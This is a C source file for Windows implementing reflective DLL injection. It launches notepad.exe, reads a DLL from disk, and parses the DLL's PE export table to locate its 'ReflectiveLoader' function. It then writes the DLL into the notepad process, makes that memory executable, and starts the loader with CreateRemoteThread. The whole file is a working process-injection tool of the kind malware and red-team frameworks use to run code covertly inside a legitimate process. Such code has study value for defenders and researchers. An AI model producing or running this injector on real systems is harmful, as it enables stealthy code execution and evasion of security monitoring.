#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

DWORD64 rva_to_offset(DWORD64 rva, DWORD64 base_address)
{
    PIMAGE_NT_HEADERS64 nt_headers_address = (PIMAGE_NT_HEADERS64)(base_address + ((PIMAGE_DOS_HEADER)base_address)->e_lfanew);

    DWORD64 section_virtual_address;
    DWORD64 section_data_address;

    PIMAGE_SECTION_HEADER section_header_address = IMAGE_FIRST_SECTION(nt_headers_address);
    if (rva < section_header_address->PointerToRawData) // if pointer to pe header
        return rva;

    for (; section_header_address->VirtualAddress != (DWORD64)NULL; section_header_address++)
    {
        // rva = virtual_address + virtual_address_offset
        // rva + raw_address = virtual_address + virtual_address_offset + raw_address
        // rva - virtual_address + raw_address = raw_address + virtual_address_offset
        if (rva >= section_header_address->VirtualAddress && rva < (section_header_address->VirtualAddress + section_header_address->SizeOfRawData))
            return rva - section_header_address->VirtualAddress + section_header_address->PointerToRawData;
    }
    return 0;
}

DWORD64 get_reflective_loader_offset(DWORD64 base_address, LPCSTR ReflectiveLoader_name)
{
    DWORD64 function_rva;
    PIMAGE_NT_HEADERS64 nt_headers_address = (PIMAGE_NT_HEADERS64)(base_address + ((PIMAGE_DOS_HEADER)base_address)->e_lfanew);

    IMAGE_DATA_DIRECTORY exports_data_directory = nt_headers_address->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)(base_address + rva_to_offset(exports_data_directory.VirtualAddress, base_address));

    DWORD* export_function_rva_address = (DWORD*)(base_address + rva_to_offset(export_directory->AddressOfFunctions, base_address));
    DWORD* export_function_name_rva_address = (DWORD*)(base_address + rva_to_offset(export_directory->AddressOfNames, base_address));
    WORD* export_function_ordinal_rva_address = (WORD*)(base_address + rva_to_offset(export_directory->AddressOfNameOrdinals, base_address));

    for(int n = 0; n < export_directory->NumberOfNames; n++)
    {
        char *export_function_name = (char *)(base_address + rva_to_offset(export_function_name_rva_address[n], base_address));

        if (!strcmp(export_function_name, ReflectiveLoader_name))
        {
            function_rva = export_function_rva_address[export_function_ordinal_rva_address[n]];
            return rva_to_offset(function_rva, base_address);
        }
    }

    return 0;
}

int main(int argc, char *argv[])
{
    // // setup

    PROCESS_INFORMATION pi;
    STARTUPINFOA Startup;
    ZeroMemory(&Startup, sizeof(Startup));
    ZeroMemory(&pi, sizeof(pi));

    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, 0, NORMAL_PRIORITY_CLASS, NULL, NULL, &Startup, &pi);
    WaitForSingleObject(pi.hProcess, 1 * 1000);

    // //
    DWORD dwOldProt;

    // get dll into virtual memory
    HANDLE file_handle = CreateFileA("dll_reflective_loader_64.dll", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD64 file_size = GetFileSize(file_handle, NULL);
    LPVOID file_buf = HeapAlloc(GetProcessHeap(), 0, file_size);
    ReadFile(file_handle, file_buf, file_size, NULL, NULL);

    DWORD64 reflective_loader_offset = get_reflective_loader_offset((DWORD64)file_buf, "ReflectiveLoader");

    HANDLE process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, pi.dwProcessId);

    LPVOID remote_file_buf_address = VirtualAllocEx(process_handle, NULL, file_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    printf("address %p\n", remote_file_buf_address + reflective_loader_offset);

    WriteProcessMemory(process_handle, remote_file_buf_address, file_buf, file_size, NULL);
    VirtualProtectEx(process_handle, remote_file_buf_address, file_size, PAGE_EXECUTE_READ, &dwOldProt);

    DWORD64 reflective_loader_address = (DWORD64)remote_file_buf_address + reflective_loader_offset;

    HANDLE thread_handle = CreateRemoteThread(process_handle, 0, 0, (LPTHREAD_START_ROUTINE)reflective_loader_address, 0, 0, 0);
    WaitForSingleObject(thread_handle, -1);

    TerminateProcess(pi.hProcess, 0);

    printf("done.");

    return 0;
}
